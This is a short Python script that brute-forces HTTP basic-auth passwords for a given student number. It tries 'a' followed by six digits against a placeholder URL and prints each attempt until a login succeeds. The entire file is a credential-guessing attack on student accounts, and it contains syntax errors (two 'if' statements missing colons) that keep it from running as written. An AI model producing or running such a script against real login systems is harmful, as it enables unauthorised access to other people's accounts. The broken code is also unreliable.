import requests

user = input("Type the student number: ")
pwd = ''
status = 401

c1 = 0
c2 = 0
c3 = 0
c4 = 0
c5 = 0
c6 = 0

while status == 401:
    pwd = 'a' + str(c1) + str(c2) + str(c3) + str(c4) + str(c5) + str(c6)
    r = requests.get('url', auth=(str(user), pwd))
    status = r.status_code

    if status == 401:
        correct = 'false'
    else:
        correct = 'true'

    print(str(r.status_code) + ' - ' + pwd + ' - ' + correct)

    c1 = c1 + 1

    if c1 == 10:
        c1 = 0
        c2 = c2 + 1
    
    if c2 == 10:
        c2 = 0
        c3 = c3 + 1

    if c3 == 10:
        c3 = 0
        c4 = c4 + 1
        
    if c4 == 10
        c4 = 0
        c5 = c5 + 1
        
    if c5 == 10
        c5 = 0
        c6 = c6 + 1

yes = input('did it work? ')
